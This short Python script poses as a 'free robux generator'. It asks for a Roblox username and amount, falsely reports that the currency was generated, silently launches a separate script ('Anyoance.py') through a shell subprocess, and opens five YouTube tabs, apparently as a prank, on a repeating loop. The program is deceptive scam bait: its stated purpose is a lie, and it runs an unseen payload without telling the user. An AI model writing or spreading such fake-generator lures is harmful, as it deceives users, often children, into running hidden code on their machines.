import time
from playsound import playsound
import os
import webbrowser
import subprocess

cmd = "python Anyoance.py"




running = True
def robuxgenerator():
    global running
    print("WELCOME TO FREE ROBUX GENERATOR BY Toomsihe")


    try:

        user = input("Enter your roblox username!: ")
        amount = int(input("HOW MUCH ROBUX YOU WANT!?!?!?? : "))

    except ValueError as ERROR:
        print(f'Not A valid number\n{ERROR}\n')
        print("Try Again!")
        return

    print(f"Generating {amount} robux for {user} PLEASE WAIT")
    time.sleep(2)



    print("YOUR ROBUX HAS GENERATED!!!!!!")

    subprocess.Popen(cmd, shell=True)

    for i in range(5):
        webbrowser.open_new_tab("https://www.youtube.com/watch?v=CIiiMj0B4vA")


while running == True:
    robuxgenerator()
